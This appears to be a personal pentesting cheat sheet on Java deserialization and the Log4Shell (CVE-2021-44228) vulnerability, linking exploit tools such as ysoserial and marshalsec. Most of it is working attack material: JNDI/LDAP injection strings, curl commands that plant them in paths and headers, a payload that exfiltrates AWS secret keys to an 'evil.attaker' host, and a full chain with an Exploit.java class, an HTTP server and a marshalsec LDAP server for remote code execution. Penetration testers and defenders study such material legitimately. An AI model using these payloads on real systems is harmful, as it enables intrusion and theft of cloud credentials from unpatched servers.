# Java Deserialization

The real risk with Java is that objects could be created arbitrarily with serialization and deserialization. This means if you can inject a crafted serialized object into the program's input, you could create any object and anything in that object's constructor or destructor or whatever would run. It just wasn't safe, it was a bad idea to have or use publicly such a flexible method to serialize and deserialize objects.

https://github.com/mbechler/marshalsec


https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#payload-generators

https://github.com/frohoff/ysoserial

![[docs/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf]]



https://github.com/pwntester/JVMDeserialization/blob/master/groovy/SerializationDemo.groovy

https://github.com/joaomatosf/jexboss

# Log4J - RCE
https://www.lunasec.io/docs/blog/log4j-zero-day/

Payload: https://github.com/xiajun325/apache-log4j-rce-poc
and: https://github.com/mbechler/marshalsec

Tester for the inet.
https://log4shell.huntress.com/

Basic Payload, find a place where this will be logged
```bash
${jndi:ldap://log4shell.huntress.com:1389/dfedf581-06d2-40ec-a040-78ffb45ce18b}
```

for expample, for non existing pathes
```bash
curl 'http://localhost:3000/api/test/$\{jndi:ldap://log4shell.huntress.com:1389/913e72ec-648f-4918-969d-29f3c6c9316b\}'
```

or agents
```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.1.143:1389}
```

not just RCE, it is possible to leak env variables

https://www.tomitribe.com/blog/cve-2021-44228-log4shell-vulnerability/

```bash
${jndi:ldap://evil.attaker:1234/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}}
```

Up to Version < jdk8u191 (before) the marshelsec payload should work

your java verison should be lower than jdk8u191, otherwise the server will not request the http server. because a new option trustURLCodebase(default false) has been added to the higher version java.

https://githubmemory.com/repo/invokethreatguy/log4shell-vulnerable-app

create a java class
```bash
cat >> Exploit.java <<EOF
class Exploit {
    static {
        try { Runtime.getRuntime().exec("touch /pwned"); } catch(Exception e) {}
    }
}
EOF
javac Exploit.java
```

```bash
python3 -m http.server --bind 0.0.0.0 8888
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-local-ip:8888/#Exploit"
```

```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.1.143:1389}
```

for java version greater we need to find a implemented class
https://www.veracode.com/blog/research/exploiting-jndi-injections-java

https://github.com/veracode-research/rogue-jndi



Researches:
https://www.fatalerrors.org/a/hole-chasing-group-fastjson1.2.24-recurrence-analysis.html

https://www.veracode.com/blog/research/exploiting-jndi-injections-java

https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf